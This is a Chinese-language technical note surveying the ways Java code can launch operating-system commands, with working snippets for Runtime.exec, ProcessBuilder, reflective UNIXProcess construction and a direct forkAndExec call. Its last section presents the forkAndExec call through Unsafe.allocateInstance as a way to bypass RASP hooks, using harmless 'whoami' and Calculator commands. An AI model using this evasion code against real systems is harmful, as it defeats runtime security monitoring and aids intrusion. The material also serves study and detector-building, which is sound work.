---
title: 命令执行总结
key: 命令执行总结
---

## 调用链

命令执行调用链：

```
Runtime.getRuntime().exec()
  new ProcessBuilder.start()
    ProcessImpl.start()
      new UNIXProcess()
        UNIXProcess().forkAndExec()
```

以上任意一个点都可以作为切入口。

## Runtime

```java
public static void main(String[] args) throws Exception {
    InputStream in = Runtime.getRuntime().exec("whoami").getInputStream();
    InputStreamReader isr = new InputStreamReader(in);
    BufferedReader br = new BufferedReader(isr);
    String line = null;
    while ((line = br.readLine()) != null) {
        System.out.println(line);
    }
}
```

## ProcessBuilder

```java
public static void main(String[] args)throws Exception {
    InputStream in = new ProcessBuilder("whoami").start().getInputStream();
    InputStreamReader isr = new InputStreamReader(in);
    BufferedReader br = new BufferedReader(isr);
    String line = null;
    while ((line = br.readLine()) != null) {
        System.out.println(line);
    }
}
```

`ProcessBuilder()`传入的是`String... command`不定长参数，构造复杂命令需要注意：`new ProcessBuilder("open","-a","calculator").start()`	

## new UNIXProcess

`ProcessImpl.start()`调用和`new UNIXProcess()`类似，只演示后者即可。

```java
//ProcessImpl.start()中的代码
static byte[] toCString(String s) {
    if (s == null) {
        return null;
    }

    byte[] bytes  = s.getBytes();
    byte[] result = new byte[bytes.length + 1];
    System.arraycopy(bytes, 0, result, 0, bytes.length);
    result[result.length - 1] = (byte) 0;
    return result;
}
public static void main(String[] strings)throws Exception {
    Class clazz = Class.forName("java.lang.UNIXProcess");
    Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
    constructor.setAccessible(true);
    String[] commands ={"open","-a","Calculator"};
    //以下照搬ProcessImpl.start()中的代码
    byte[][] args = new byte[commands.length - 1][];
    int size = args.length; // For added NUL bytes
    for (int i = 0; i < args.length; i++) {
        args[i] = commands[i+1].getBytes();
        size += args[i].length;
    }
    byte[] argBlock = new byte[size];
    int i = 0;
    for (byte[] arg : args) {
        System.arraycopy(arg, 0, argBlock, i, arg.length);
        i += arg.length + 1;
    }
    int[] envc = new int[1];
    int[] std_fds = new int[]{-1, -1, -1};
    Object object = constructor.newInstance(
            toCString(commands[0]), argBlock, args.length,
            null, envc[0], null, std_fds, false
    );
}
```

## ✨forkAndExec()

**RASP**如果拦截了**UNIXProcess**的构造方法，直接return或者抛出异常，可以利用**Unsafe**类创建对象绕过。

`Unsafe.allocateInstance()`允许反射创建对象时不执行其构造函数，从而直接执行`UNIXProcess.forkAndExec()`。

```java
public class FE {
    static byte[] toCString(String s) {
        if (s == null) {
            return null;
        }

        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }
    public static void main(String[] Args) throws Exception {
        String[] strs={"open","-a","Calculator"};
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
        Class processClass = Class.forName("java.lang.UNIXProcess");
        Object processObject = unsafe.allocateInstance(processClass);
        byte[][] args = new byte[strs.length - 1][];
        int      size = args.length; // For added NUL bytes

        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        }
        Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
        Field helperpathField      = processClass.getDeclaredField("helperpath");
        launchMechanismField.setAccessible(true);
        helperpathField.setAccessible(true);
        Object launchMechanismObject = launchMechanismField.get(processObject);
        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

        int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
        int[] envc                 = new int[1];
        int[] std_fds              = new int[]{-1, -1, -1};
        Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{
                int.class, byte[].class, byte[].class, byte[].class, int.class,
                byte[].class, int.class, byte[].class, int[].class, boolean.class
        });
        forkMethod.setAccessible(true);
        int pid = (int) forkMethod.invoke(processObject, new Object[]{
                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        });
    }
}
```
